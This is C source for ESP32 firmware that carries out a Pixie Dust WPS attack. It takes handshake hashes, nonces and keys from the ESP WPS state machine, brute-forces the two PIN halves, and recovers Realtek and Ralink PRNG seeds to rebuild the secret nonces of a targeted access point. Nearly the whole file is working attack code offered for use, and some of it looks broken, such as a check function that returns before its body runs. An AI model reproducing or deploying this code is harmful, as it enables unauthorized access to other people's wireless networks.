#pragma GCC diagnostic ignored "-Wmaybe-uninitialized"


#include "wps/pixie.h"
#include "esp_log.h"
#include "esp_wps.h"
#include "esp_wps_i.h"
#include "esp_wifi.h"
#include "managers/ap_manager.h"
#include <esp_event_base.h>

#define TAG "WPS"

#define WPS_CONFIG_INIT(type, wps_pin) { \
    .wps_type = type, \
    .factory_info = {   \
        ESP_COMPILER_DESIGNATED_INIT_AGGREGATE_TYPE_STR(manufacturer, "ESPRESSIF")  \
        ESP_COMPILER_DESIGNATED_INIT_AGGREGATE_TYPE_STR(model_number, CONFIG_IDF_TARGET)  \
        ESP_COMPILER_DESIGNATED_INIT_AGGREGATE_TYPE_STR(model_name, "ESPRESSIF IOT")  \
        ESP_COMPILER_DESIGNATED_INIT_AGGREGATE_TYPE_STR(device_name, "ESP DEVICE")  \
    },  \
    ESP_COMPILER_DESIGNATED_INIT_AGGREGATE_TYPE_STR(pin, wps_pin) \
}


void uint_to_char_array(unsigned int num, unsigned int len, char *dst)
{
    unsigned int mul = 1;
	while (len--) {
		dst[len] = (num % (mul * 10) / mul) + '0';
		mul *= 10;
	}
}

struct wps_data_2 {
	/**
	 * wps - Pointer to long term WPS context
	 */
	struct wps_context *wps;

	/**
	 * registrar - Whether this end is a Registrar
	 */
	int registrar;

	/**
	 * er - Whether the local end is an external registrar
	 */
	int er;

	enum {
		/* Enrollee states */
		SEND_M1, RECV_M2, SEND_M3, RECV_M4, SEND_M5, RECV_M6, SEND_M7,
		RECV_M8, RECEIVED_M2D, WPS_MSG_DONE, RECV_ACK, WPS_FINISHED,
		SEND_WSC_NACK,

		/* Registrar states */
		RECV_M1, SEND_M2, RECV_M3, SEND_M4, RECV_M5, SEND_M6,
		RECV_M7, SEND_M8, RECV_DONE, SEND_M2D, RECV_M2D_ACK
	} state;

	u8 uuid_e[16];
	u8 uuid_r[16];
	u8 mac_addr_e[ETH_ALEN];
	u8 nonce_e[WPS_NONCE_LEN];
	u8 nonce_r[WPS_NONCE_LEN];
	u8 psk1[WPS_PSK_LEN];
	u8 psk2[WPS_PSK_LEN];
	u8 snonce[2 * WPS_SECRET_NONCE_LEN];
	u8 peer_hash1[WPS_HASH_LEN];
	u8 peer_hash2[WPS_HASH_LEN];

	struct wpabuf *dh_privkey;
	struct wpabuf *dh_pubkey_e;
	struct wpabuf *dh_pubkey_r;
	u8 authkey[WPS_AUTHKEY_LEN];
	u8 keywrapkey[WPS_KEYWRAPKEY_LEN];
	u8 emsk[WPS_EMSK_LEN];

	struct wpabuf *last_msg;

	u8 *dev_password;
	size_t dev_password_len;
	u16 dev_pw_id;
	int pbc;
	u8 *alt_dev_password;
	size_t alt_dev_password_len;
	u16 alt_dev_pw_id;

	u8 peer_pubkey_hash[20];
	int peer_pubkey_hash_set;

	/**
	 * request_type - Request Type attribute from (Re)AssocReq
	 */
	u8 request_type;

	/**
	 * encr_type - Available encryption types
	 */
	u16 encr_type;

	/**
	 * auth_type - Available authentication types
	 */
	u16 auth_type;

	u8 *new_psk;
	size_t new_psk_len;

	int wps_pin_revealed;
};

static int crack(struct wps_state *wps, char *pin)
{
	return !(crack_first_half(wps, pin, 0) && crack_second_half(wps, pin));
}

int pthread_create(pthread_t *thread, const void *attr, void *(*start_routine)(void *), void *arg) {
    BaseType_t result;

    // Create a FreeRTOS task that starts the routine
    result = xTaskCreate((TaskFunction_t)start_routine, "Thread", 4096, arg, tskIDLE_PRIORITY, thread);

    // Return 0 on success or -1 on failure
    return (result == pdPASS) ? 0 : -1;
}

int pthread_join(pthread_t thread, void **retval) {
    while (eTaskGetState(thread) != eDeleted) {
        vTaskDelay(1);
    }

    return 0;  // Success
}

static inline uint32_t *glibc_fast_nonce(uint32_t seed, uint32_t *dest)
{
	uint32_t word0 = 0, word1 = 0, word2 = 0, word3 = 0;

#ifdef PWPS_UNERRING
	if      (seed == 0x7fffffff) seed = 0x13f835f3;
	else if (seed == 0xfffffffe) seed = 0x5df735f1;
#endif

	for (int j = 0; j < 31; j++) {
		word0 += seed * glibc_seed_tbl[j + 3];
		word1 += seed * glibc_seed_tbl[j + 2];
		word2 += seed * glibc_seed_tbl[j + 1];
		word3 += seed * glibc_seed_tbl[j + 0];

		/* This does: seed = (16807LL * seed) % 0x7fffffff
		   using the sum of digits method which works for mod N, base N+1 */
		uint64_t p = 16807ULL * seed;
		p = (p >> 31) + (p & 0x7fffffff);
		seed = (p >> 31) + (p & 0x7fffffff);
#if 0 /* Same as PWPS_UNERRING */
		if (seed == 0x7fffffff) seed = 0;
#endif
	}
	dest[0] = word0 >> 1;
	dest[1] = word1 >> 1;
	dest[2] = word2 >> 1;
	dest[3] = word3 >> 1;
	return dest;
}

static inline uint32_t glibc_fast_seed(uint32_t seed)
{
	uint32_t word0 = 0;

#ifdef PWPS_UNERRING
	if      (seed == 0x7fffffff) seed = 0x13f835f3;
	else if (seed == 0xfffffffe) seed = 0x5df735f1;
#endif

	for (int j = 3; j < 31 + 3 - 1; j++) {
		word0 += seed * glibc_seed_tbl[j];

		/* This does: seed = (16807LL * seed) % 0x7fffffff
		   using the sum of digits method which works for mod N, base N+1 */
		uint64_t p = 16807ULL * seed;
		p = (p >> 31) + (p & 0x7fffffff);
		seed = (p >> 31) + (p & 0x7fffffff);
#if 0 /* Same as PWPS_UNERRING */
		if (seed == 0x7fffffff) seed = 0;
#endif
	}
	return (word0 + seed * glibc_seed_tbl[33]) >> 1;
}

static int check_pin_half(const uint8_t *authkey, size_t authkey_len, const char pinhalf[4], uint8_t *psk, const uint8_t *es, struct wps_state *wps, const uint8_t *ehash) {
    uint8_t buffer[WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2];
    uint8_t result[WPS_HASH_LEN];

    
    hmac_sha256(authkey, authkey_len, (uint8_t *)pinhalf, 4, psk);

   
    memcpy(buffer, es, WPS_SECRET_NONCE_LEN);
    memcpy(buffer + WPS_SECRET_NONCE_LEN, psk, WPS_PSK_LEN);
    memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
    memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);

    
    hmac_sha256(authkey, authkey_len, buffer, sizeof(buffer), result);

    
    return !memcmp(result, ehash, WPS_HASH_LEN);
}

static int crack_first_half(struct wps_state *wps, char *pin, const uint8_t *es1_override) {
    *pin = 0;
    const uint8_t *es1 = es1_override ? es1_override : wps->e_s1;

    
    if (check_empty_pin_half(es1, wps, wps->e_hash1)) {
        memcpy(wps->psk1, wps->empty_psk, WPS_HASH_LEN);
        return -1;
    }

    unsigned first_half;
    uint8_t psk[WPS_HASH_LEN] = {0};

    
    for (first_half = 0; first_half < 10000; first_half++) {
        uint_to_char_array(first_half, 4, pin);

        
        if (check_pin_half(wps->authkey, WPS_AUTHKEY_LEN, pin, psk, es1, wps, wps->e_hash1)) {
            pin[4] = 0;
            memcpy(wps->psk1, psk, sizeof(psk));
            return 1;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    return 0;
}


static int crack_second_half(struct wps_state *wps, char *pin) {
    if (!pin[0] && check_empty_pin_half(wps->e_s2, wps, wps->e_hash2)) {
        memcpy(wps->psk2, wps->empty_psk, WPS_HASH_LEN);
        return 1;
    }

    unsigned second_half, first_half = atoi(pin);
    char *s_pin = pin + strlen(pin);
    uint8_t psk[WPS_HASH_LEN];

    
    for (second_half = 0; second_half < 1000; second_half++) {
        unsigned int checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
        unsigned int c_second_half = second_half * 10 + checksum_digit;
        uint_to_char_array(c_second_half, 4, s_pin);


        if (check_pin_half(wps->authkey, WPS_AUTHKEY_LEN, s_pin, psk, wps->e_s2, wps, wps->e_hash2)) {
            memcpy(wps->psk2, psk, sizeof(psk));
            pin[8] = 0;
            return 1;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    
    for (second_half = 0; second_half < 10000; second_half++) {
        if (wps_pin_valid(first_half * 10000 + second_half)) {
            continue;
        }

        uint_to_char_array(second_half, 4, s_pin);

        
        if (check_pin_half(wps->authkey, WPS_AUTHKEY_LEN, s_pin, psk, wps->e_s2, wps, wps->e_hash2)) {
            memcpy(wps->psk2, psk, sizeof(psk));
            pin[8] = 0;
            return 1;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    return 0;
}

static uint32_t ecos_rand_knuth(uint32_t *seed)
{
	#define MM 2147483647 /* Mersenne prime */
	#define AA 48271      /* This does well in the spectral test */
	#define QQ 44488      /* MM / AA */
	#define RR 3399       /* MM % AA, important that RR < QQ */

	*seed = AA * (*seed % QQ) - RR * (*seed / QQ);
	if (*seed & 0x80000000)
		*seed += MM;

	return *seed;
}

/* Simplest */
static uint32_t ecos_rand_simplest(uint32_t *seed)
{
	*seed = (*seed * 1103515245) + 12345; /* Permutate seed */
	return *seed;
}

/* Simple, Linear congruential generator */
static uint32_t ecos_rand_simple(uint32_t *seed)
{
	uint32_t s = *seed;
	uint32_t uret;

	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret = s & 0xffe00000;                 /* Use top 11 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfffc0000) >> 11;        /* Use top 14 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfe000000) >> (11 + 14); /* Use top 7 bits */

	*seed = s;
	return uret;
}


static void crack_thread_rtl(struct crack_job *j)
{
	uint32_t seed = j->start;
	uint32_t limit = job_control.end;
	uint32_t tmp[4];

	while (!job_control.nonce_seed) {
		if (glibc_fast_seed(seed) == job_control.randr_enonce[0]) {
			if (!memcmp(glibc_fast_nonce(seed, tmp), job_control.randr_enonce, WPS_NONCE_LEN)) {
				job_control.nonce_seed = seed;
				printf("Seed found");
			}
		}

		if (seed == 0) break;

		seed--;

		if (seed < j->start - 1000) {
			int64_t tmp = (int64_t)j->start - 1000 * job_control.jobs;
			if (tmp < 0) break;
			j->start = tmp;
			seed = j->start;
			if (seed < limit) break;
		}
	}
}


static unsigned char ralink_randbyte(struct ralink_randstate *state)
{
	unsigned char r = 0;
	for (int i = 0; i < 8; i++) {
#if defined(__mips__) || defined(__mips)
		const uint32_t lsb_mask = -(state->sreg & 1);
		state->sreg ^= lsb_mask & 0x80000057;
		state->sreg >>= 1;
		state->sreg |= lsb_mask & 0x80000000;
		r = (r << 1) | (lsb_mask & 1);
#else
		unsigned char result;
		if (state->sreg & 0x00000001) {
			state->sreg = ((state->sreg ^ 0x80000057) >> 1) | 0x80000000;
			result = 1;
		}
		else {
			state->sreg = state->sreg >> 1;
			result = 0;
		}
		r = (r << 1) | result;
#endif
	}
	return r;
}

static void ralink_randstate_restore(struct ralink_randstate *state, uint8_t r)
{
	for (int i = 0; i < 8; i++) {
		const unsigned char result = r & 1;
		r = r >> 1;
		if (result) {
			state->sreg = (((state->sreg) << 1) ^ 0x80000057) | 0x00000001;
		}
		else {
			state->sreg = state->sreg << 1;
		}
	}
}

static unsigned char ralink_randbyte_backwards(struct ralink_randstate *state)
{
	unsigned char r = 0;
	for (int i = 0; i < 8; i++) {
		unsigned char result;
		if (state->sreg & 0x80000000) {
			state->sreg = ((state->sreg << 1) ^ 0x80000057) | 0x00000001;
			result = 1;
		}
		else {
			state->sreg = state->sreg <<  1;
			result = 0;
		}
		r |= result << i;
	}
	return r;
}


static int crack_rt(uint32_t start, uint32_t end, uint32_t *result)
{
	uint32_t seed;
	struct ralink_randstate prng;
	unsigned char testnonce[16] = {0};
	unsigned char *search_nonce = (void *)job_control.randr_enonce;

	for (seed = start; seed < end; seed++) {
		int i;
		prng.sreg = seed;
		testnonce[0] = ralink_randbyte(&prng);
		if (testnonce[0] != search_nonce[0]) continue;
		for (i = 1; i < 4; i++) testnonce[i] = ralink_randbyte(&prng);
		if (memcmp(testnonce, search_nonce, 4)) continue;
		for (i = 4; i < WPS_NONCE_LEN; i++) testnonce[i] = ralink_randbyte(&prng);
		if (!memcmp(testnonce, search_nonce, WPS_NONCE_LEN)) {
			*result = seed;
			return 1;
		}
	}
	return 0;
}


static void crack_thread_rt(struct crack_job *j)
{
	uint32_t start = j->start, end;
	uint32_t res;

	while (!job_control.nonce_seed) {
		uint64_t tmp = (uint64_t)start + (uint64_t)1000;
		if (tmp > (uint64_t)job_control.end) tmp = job_control.end;
		end = tmp;

		if (crack_rt(start, end, &res)) {
			job_control.nonce_seed = res;
			printf("Seed found");
		}
		tmp = (uint64_t)start + (uint64_t)(1000 * job_control.jobs);
		if (tmp > (uint64_t)job_control.end) break;
		start = tmp;
	}
}


static void *crack_thread(void *arg)
{
	struct crack_job *j = arg;

	if (job_control.mode == RTL819x)
		crack_thread_rtl(j);
	else if (job_control.mode == RT)
		crack_thread_rt(j);
	else if (job_control.mode == -RTL819x)
		crack_thread_rtl_es(j);
	else
		assert(0);

	return 0;
}

static void setup_thread(int i)
{
	pthread_create(&job_control.crack_jobs[i].thr, 0, crack_thread, &job_control.crack_jobs[i]);
}

static void init_crack_jobs(struct wps_state *wps, int mode)
{
	job_control.wps = wps;
	job_control.jobs = wps->jobs;
	job_control.end = (mode == RTL819x) ? (uint32_t)wps->end : 0xffffffffu;
	job_control.mode = mode;
	job_control.nonce_seed = 0;
	memset(job_control.randr_enonce, 0, sizeof(job_control.randr_enonce));

	/* Convert Enrollee nonce to the sequence may be generated by current random function */
	int i, j = 0;
	if (mode == -RTL819x) ; /* nuffin' */
	else if (mode == RTL819x)
		for (i = 0; i < 4; i++) {
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
			job_control.randr_enonce[i] <<= 8;
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
			job_control.randr_enonce[i] <<= 8;
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
			job_control.randr_enonce[i] <<= 8;
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
		}
	else
		memcpy(job_control.randr_enonce, wps->e_nonce, WPS_NONCE_LEN);

	job_control.crack_jobs = malloc(wps->jobs * sizeof (struct crack_job));
	uint32_t curr = 0;
	if (mode == RTL819x) curr = wps->start;
	else if (mode == RT) curr = 1; /* Ralink LFSR jumps from 0 to 1 internally */
	int32_t add = (mode == RTL819x) ? -1000 : 1000;
	for (i = 0; i < wps->jobs; i++) {
		job_control.crack_jobs[i].start = (mode == -RTL819x) ? (uint32_t)i + 1 : curr;
		setup_thread(i);
		curr += add;
	}
}


static uint32_t collect_crack_jobs()
{
	for (int i = 0; i < job_control.jobs; i++) {
		void *ret;
		pthread_join(job_control.crack_jobs[i].thr, &ret);
	}
	free(job_control.crack_jobs);
	return job_control.nonce_seed;
}


static void rtl_nonce_fill(uint8_t *nonce, uint32_t seed)
{
	uint8_t *ptr = nonce;
	uint32_t word0 = 0, word1 = 0, word2 = 0, word3 = 0;

	for (int j = 0; j < 31; j++) {
		word0 += seed * glibc_seed_tbl[j + 3];
		word1 += seed * glibc_seed_tbl[j + 2];
		word2 += seed * glibc_seed_tbl[j + 1];
		word3 += seed * glibc_seed_tbl[j + 0];

		/* This does: seed = (16807LL * seed) % 0x7fffffff
		   using the sum of digits method which works for mod N, base N+1 */
		const uint64_t p = 16807ULL * seed; /* Seed is always positive (31 bits) */
		seed = (p >> 31) + (p & 0x7fffffff);
	}

	uint32_t be;
	be = htonl(word0 >> 1); memcpy(ptr,      &be, sizeof be);
	be = htonl(word1 >> 1); memcpy(ptr +  4, &be, sizeof be);
	be = htonl(word2 >> 1); memcpy(ptr +  8, &be, sizeof be);
	be = htonl(word3 >> 1); memcpy(ptr + 12, &be, sizeof be);
}


static int find_rtl_es1(struct wps_state *wps, char *pin, uint8_t *nonce_buf, uint32_t seed)
{
	rtl_nonce_fill(nonce_buf, seed);

	return crack_first_half(wps, pin, nonce_buf);
}

static void crack_thread_rtl_es(struct crack_job *j)
{
	int thread_id = j->start;
	uint8_t nonce_buf[WPS_SECRET_NONCE_LEN];
	char pin[WPS_PIN_LEN + 1];
	int dist, max_dist = (MODE3_TRIES + 1);

	for (dist = thread_id; !job_control.nonce_seed && dist < max_dist; dist += job_control.jobs) {
		if (find_rtl_es1(job_control.wps, pin, nonce_buf, job_control.wps->nonce_seed + dist)) {
			job_control.nonce_seed = job_control.wps->nonce_seed + dist;
			memcpy(job_control.wps->e_s1, nonce_buf, sizeof nonce_buf);
			memcpy(job_control.wps->pin, pin, sizeof pin);
		}

		if (job_control.nonce_seed)
			break;

		if (find_rtl_es1(job_control.wps, pin, nonce_buf, job_control.wps->nonce_seed - dist)) {
			job_control.nonce_seed = job_control.wps->nonce_seed - dist;
			memcpy(job_control.wps->e_s1, nonce_buf, sizeof nonce_buf);
			memcpy(job_control.wps->pin, pin, sizeof pin);
		}
	}
}


static int find_rtl_es(struct wps_state *wps)
{

	init_crack_jobs(wps, -RTL819x);

	/* Check distance 0 in the main thread, as it is the most likely */
	uint8_t nonce_buf[WPS_SECRET_NONCE_LEN];
	char pin[WPS_PIN_LEN + 1];

	if (find_rtl_es1(wps, pin, nonce_buf, wps->nonce_seed)) {
		job_control.nonce_seed = wps->nonce_seed;
		memcpy(wps->e_s1, nonce_buf, sizeof nonce_buf);
		memcpy(wps->pin, pin, sizeof pin);
	}

	collect_crack_jobs();

	if (job_control.nonce_seed) {
		printf("First pin half found");
		wps->s1_seed = job_control.nonce_seed;
		char pin_copy[WPS_PIN_LEN + 1];
		strcpy(pin_copy, wps->pin);
		int j;
		/* We assume that the seed used for es2 is within a range of 10 seconds
		   forwards in time only */
		for (j = 0; j < 10; j++) {
			strcpy(wps->pin, pin_copy);
			rtl_nonce_fill(wps->e_s2, wps->s1_seed + j);
			if (crack_second_half(wps, wps->pin)) {
				wps->s2_seed = wps->s1_seed + j;
				printf("Pin found");
				return RTL819x;
			}
		}
	}
	return NONE;
}


static void empty_pin_hmac(struct wps_state *wps)
{
	/* Since the empty pin psk is static once initialized, we calculate it only once */

    wps->empty_psk = (uint8_t*)malloc(WPS_AUTHKEY_LEN);


	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, NULL, 0, wps->empty_psk);
}


static int check_empty_pin_half(const uint8_t *es, struct wps_state *wps, const uint8_t *ehash)
{
    return 0;

	uint8_t buffer[WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2];
	uint8_t result[WPS_HASH_LEN];

	memcpy(buffer, es, WPS_SECRET_NONCE_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->empty_psk, WPS_PSK_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, sizeof buffer, result);

	return !memcmp(result, ehash, WPS_HASH_LEN);
}

static void wps_handle()
{
START:
    struct wps_sm* wps_sm_inst = wps_sm_get();
    if (!wps_sm_inst) {
        ESP_LOGE(TAG, "wps_sm_inst is NULL");
        return;
    }

    struct wps_state* wps_stat = malloc(sizeof(struct wps_state));
    if (!wps_stat) {
        ESP_LOGE(TAG, "Failed to allocate memory for wps_stat");
        return;
    }

    // No need to check for NULL here, bssid is an array and always exists
    wps_stat->e_bssid = wps_sm_inst->bssid;

    // Get wps_data_2
    struct wps_data_2* ctxptr = (struct wps_data_2*)wps_sm_inst->wps;
    if (!ctxptr) {
        vTaskDelay(pdMS_TO_TICKS(50));
        free(wps_stat);
        goto START;
        return;
    }

    // No need to check for NULL for these arrays since they always exist
    wps_stat->e_hash1 = ctxptr->peer_hash1;
    wps_stat->e_hash2 = ctxptr->peer_hash2;
    wps_stat->psk1 = ctxptr->psk1;
    wps_stat->psk2 = ctxptr->psk2;
    wps_stat->e_nonce = ctxptr->nonce_e;
    wps_stat->r_nonce = ctxptr->nonce_r;
    wps_stat->authkey = ctxptr->authkey;

    // Handle wpabuf pointers for dh_pubkey_r and dh_pubkey_e
    if (ctxptr->dh_pubkey_r) {
        // Assuming dh_pubkey_r is a wpabuf, you might need to access its data
        wps_stat->pkr = wpabuf_head_u8(ctxptr->dh_pubkey_r);
    } else {
        vTaskDelay(pdMS_TO_TICKS(50));
        free(wps_stat);
        goto START;
        return;
    }

    if (ctxptr->dh_pubkey_e) {
        // Assuming dh_pubkey_e is a wpabuf, you might need to access its data
        wps_stat->pke = wpabuf_head_u8(ctxptr->dh_pubkey_e);
    } else {
        vTaskDelay(pdMS_TO_TICKS(50));
        free(wps_stat);
        goto START;
        return;
    }

    ESP_LOGE(TAG, "Got All Needed Info");

    // No need to check for NULL for keywrapkey since it's an array
    wps_stat->wrapkey = ctxptr->keywrapkey;

    // Proceed with the HMAC and crack operations
    empty_pin_hmac(wps_stat);

    char thepin[9];
    crack(wps_stat, thepin);  // Ensure 'thepin' is of correct type

    // Clean up wps_stat after use
    free(wps_stat);
    esp_wifi_wps_disable();
}

static void wps_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_WPS_ER_SUCCESS) {
        wifi_event_sta_wps_er_success_t* wps_success = (wifi_event_sta_wps_er_success_t*)event_data;
        
        ESP_LOGI(TAG, "WPS connection successful.");
        ESP_LOGI(TAG, "Connected to SSID: %s", wps_success->ap_cred->ssid);
        
        // Start Wi-Fi connection
        esp_wifi_connect();
    } 
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_WPS_ER_FAILED) {
        ESP_LOGE(TAG, "WPS connection failed.");
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_WPS_ER_TIMEOUT) {
        ESP_LOGE(TAG, "WPS connection timed out.");
        esp_wifi_wps_disable();
    } 
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_WPS_ER_PIN) {
        wifi_event_sta_wps_er_pin_t* wps_pin_event = (wifi_event_sta_wps_er_pin_t*)event_data;
        ESP_LOGI(TAG, "WPS PIN Event: PIN = %s", wps_pin_event->pin_code);
    }
}


int compute_wps_checksum(int pin) {
    int accum = 0;

    pin *= 10;  // Move the pin left by one digit to allow space for the checksum

    // Calculate checksum (according to WPS specification)
    accum += 3 * ((pin / 10000000) % 10);
    accum += 1 * ((pin / 1000000) % 10);
    accum += 3 * ((pin / 100000) % 10);
    accum += 1 * ((pin / 10000) % 10);
    accum += 3 * ((pin / 1000) % 10);
    accum += 1 * ((pin / 100) % 10);
    accum += 3 * ((pin / 10) % 10);

    int checksum = (10 - (accum % 10)) % 10;

    // Return the pin with the checksum appended
    return pin + checksum;
}


void wps_start_connection(uint8_t *bssid) {
    esp_wifi_set_mode(WIFI_MODE_STA);

    esp_wps_config_t wps_config = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);

    wifi_config_t wifi_config = {0};
    memcpy(wifi_config.sta.bssid, bssid, 6);
    wifi_config.sta.bssid_set = true;

    esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config);

    // Register the event handler for WPS
    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wps_event_handler, NULL);

    printf("About to enable WPS");

    // Enable WPS
    esp_wifi_wps_enable(&wps_config);
    esp_wifi_wps_start(0);  // Start WPS connection process


    ESP_LOGI(TAG, "WPS PIN connection initiated for BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

    wps_handle();
}